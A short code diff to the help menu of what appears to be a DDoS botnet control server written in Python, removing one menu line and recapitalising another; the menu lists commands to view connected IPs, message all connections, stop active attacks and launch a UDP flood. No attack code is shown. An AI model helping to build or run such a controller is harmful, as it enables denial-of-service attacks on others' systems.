@@ -48,11 +48,10 @@ def userInterface():
             print()
             print("ADD            Shows a list of every connected ip address.")
             print("CLS            Clears command prompt.")
-            print("CON            Maximum number of connections.")
             print("EXIT           Exits server.")
             print("HELP           Shows list of commands.")
             print("MSG            Sends a costom message to all connections.")
-            print("Stop           Stops every active attack.")
+            print("STOP           Stops every active attack.")
             print("UDP            Starts a DDoS attack using UDP")
             print()
         elif command[0] == "cls":
